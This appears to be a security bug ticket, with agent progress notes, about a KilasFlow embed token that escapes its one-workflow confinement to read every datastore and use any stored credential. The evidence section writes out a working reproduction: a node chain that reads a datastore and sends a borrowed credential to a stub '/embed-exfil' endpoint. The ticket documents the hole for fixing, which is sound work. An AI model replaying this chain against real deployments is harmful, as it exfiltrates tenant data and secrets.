---
id: BUG-9853ay
title: Workflow-scoped embed session escapes to all datastores + any credential
status: testing
priority: critical
labels:
    - embed
    - security
    - tenancy
    - full-review
    - wf-c415e773
parent: EPIC-cfe7ny
created: "2026-09-19T12:06:09Z"
updated: "2026-09-20T00:41:49Z"
---

Source: KilasFlow full-review workflow `wf_c415e773-4e1` (Find 14/14 + Verify 14/14 + Critique 1/1). Evidence: live repros against stub/n8n/private instances in `scratchpad/work/<dim>/` (FINDINGS.md, PROGRESS.md) plus journal `wf_c415e773-4e1/journal.jsonl`. Excluded from this epic: 10 verifier-refuted/tracked items (documented bounds, already-open FEAT-1axhdn/FEAT-8mymac halves).

Consolidates 1 finding(s) from dims: find:api-security-tenancy.

---
### Embed session (workflow scope) escapes its one-workflow confinement: reads/drops every tenant datastore and uses any tenant credential [find:api-security-tenancy] (critical/security) · area: embed / datastore node / credentials · confidence: high

A workflow-scoped embed token (the credential the product hands to browsers) can PUT arbitrary nodes into its own workflow and run them, so the Datastore node's Table:List/Delete and any credential id execute with full tenant authority — defeating the documented guarantee that no embed scope ever grants datastore management or a credential the workflow doesn't reference.

Evidence: Private auth instance :8107. Minted embed session for a new workflow W (scopes workflow:write+run, origin https://host.example). With header X-KilasFlow-Embed: GET /datastores -> 403 (as designed) and the datastores option-loader refuses embedded editors, BUT: PUT /workflows/W with nodes [manual -> datastore{resource:table,operation:list} -> datastore{operation:get,dataTableId:{mode:name,value:'[api-security-tenancy] A-ds'},returnAll:true} -> httpRequest{url:http://127.0.0.1:8097/embed-exfil, credentials:{httpHeaderAuth: <a credential W never referenced>}}] -> 200; POST /workflows/W/run -> 202; GET /executions/{id} -> succeeded. Node 'dl' output listed datastore_01a0b8e1-... '[api-security-tenancy] A-ds' with its columns; node 'dg' returned the private row count; the stub received 'X-Secret: SECRET-A-hdr-7f3e91'. GET /credentials over the embed token also returns every tenant credential 

n8n behavior: n8n does not expose a comparable browser-embeddable per-workflow token; its embedding model keeps write/credential authority server-side. Parity target: an embedded editor confined to one workflow must not be able to reach sibling datastores or arbitrary credentials.

Impact: Breaks the core embed/white-label isolation model KilasFlow sells: a token designed to sit in an untrusted host page grants tenant-wide data-plane access (enumerate/read/clear/drop every datastore) and use of any stored credential, bypassing datastore-scoped sessions and the load-options 'workflow must reference this credential' check.

Suggested fix: Enforce embed confinement at save AND run time, not only at the HTTP path gate: when a request carries an embed session, validate the stored/submitted document — credentials restricted to an allowlist minted into the session (or already on the stored revision), Datastore nodes only addressing datastores named in the session and never table-level list/create/delete, Execute-Workflow limited to allowed ids; mirror the check in the engine run path so an old revision can't be replayed; narrow GET /c

Files: internal/api/middleware/embed.go, internal/api/handlers/embed.go, nodes/datastore.go, internal/loadoptions/datastores.go

## Acceptance criteria

- [ ] Embed session (workflow scope) escapes its one-workflow confinement: reads/drops every tenant datastore and us
- [ ] Adversarial re-verify against live stub/n8n like the Verify phase (no code-only close)
## Progress 2026-09-19 (SecurityDx)
- Status: doing. Research + partial implementation done this session.

## Progress 2026-09-19 (SecurityFront2) — landed, testing
Status: testing (code landed; one scoped test pending, see Unverified).
Fix: an embed session's authority is now minted into its token as a `Confinement`
(credentials, data tables by id+name, sub-workflow ids), derived at mint time from
the revision the workflow's OWNER published (active, else latest), and enforced at
every point an embed session can hand the server a document: PUT (save),
publish, restore, and run. A document is never its own authority, so a revision
poisoned before the check existed cannot re-authorise itself.
- internal/embed/confinement.go (new): Confinement + DatastoreRef, accessors,
  normalisation (trim/dedupe/sort, self-workflow always allowed).
- internal/embed/embed.go: Session.Confinement + Request.Confinement, normalised in Issue.
- nodes/embedscope.go (new): DocumentReferences (inverse of the check, used to mint)
  and EmbedScopeIssues (the check). Data-table table operations (create/list/rename/
  deleteTable/clear) refused unconditionally; row ops must address an allowlisted
  table by id or by name (case-insensitive, matching the executor's resolution); an
  expression in dataTableId/workflowId is refused (a target the check cannot read
  cannot be bounded); `kilasflow.datastoreTool` (agent tool) is covered too.
- internal/api/handlers/embedscope.go (new): embedDocumentProblem,
  embedConfinementOf, embedVersionProblem, embedStoredProblem, embedAllowsCredential.
- internal/api/handlers/workflows.go: checks in Update, PublishVersion, RestoreVersion, Run.
- internal/api/handlers/embed.go: mint derives the confinement from the published revision.
- internal/api/handlers/credentials.go: GET /credentials narrowed to the session's
  confinement (names only, and only the ones its document may attach).
Evidence (scoped, passed):
- `go test ./internal/embed/ -count=1` ok
- `go test ./nodes/ -count=1 -run 'Embed|DocumentReferences'` ok
- `go build ./internal/config/ ./internal/embed/ ./nodes/` ok
Adversarial reproduction in internal/api/embed_confinement_test.go: 8 API-level tests
(credential the workflow never referenced -> 403; every table operation -> 403; sibling
table by id and by name -> 403; the published revision's own reference -> 200; a draft
outside the published revision -> save 403 AND run 403; credential picker narrowed;
dashboard unaffected).
Unverified: `go test ./internal/api/ -run 'EmbedConfinement|Embed'` could not run —
internal/api/handlers and internal/webhook were mid-edit by sibling agents for the whole
session (undefined symbols in their files). Re-run it once the wave settles.
Known residual (documented, not hidden): for a workflow that has NEVER been activated the
confinement is derived from its latest draft, because there is no owner-published revision
to read. A draft poisoned before this check existed would therefore still hold its own
references. The unconditional table-operation refusal still stops the list/drop half for
such a revision.
Remaining in this ticket: the second acceptance criterion (live stub/n8n adversarial
re-verify) needs a running instance and is Main's call.
